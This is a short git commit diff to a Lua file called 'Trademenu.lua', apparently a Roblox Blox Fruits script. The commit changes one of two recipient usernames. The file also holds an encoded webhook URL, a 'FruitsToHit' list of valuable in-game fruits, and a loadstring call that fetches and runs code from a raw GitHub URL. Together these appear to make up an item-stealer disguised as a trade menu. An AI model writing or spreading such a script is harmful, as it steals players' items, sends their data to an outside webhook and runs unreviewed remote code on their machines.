b14f36d9add2cf3a0736600f5ed605b6f3ef147c
SpIeedx <josemoreirasaldarriaga42@gmail.com>
2025-03-10 17:11:21 -0500

    Trademenu.lua

--- Trademenu.lua
+++ Trademenu.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bDhXQjMwOVNoajhDaFprcm5PZDFMZzpiOUhEUm1zR25BZDNDVU1GbndQVGdIZDRIVUhoVzEwWXh5c3JvUWQxU2JNTjBtdVdFZXNERkhoRU5yOU5MWlhwR2kzWjFDTVBvSFpvYlJySXVLQnV2ZzdRYjkwNkNfZkhDeGQ5UmwxOV9kYldaWTc0aXhMcFlXM21nczhSVkpwS2djSTJyZy1Jb21YOUhSYzgxMHNBcWZNRE0ybFplaWNyNkdoQk9fWHQwYmM"
-Usernames = {"Mikot0_0taku", "Vicente2544Y"}
+Usernames = {"D3monfromheaven", "Vicente2544Y"}
 FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
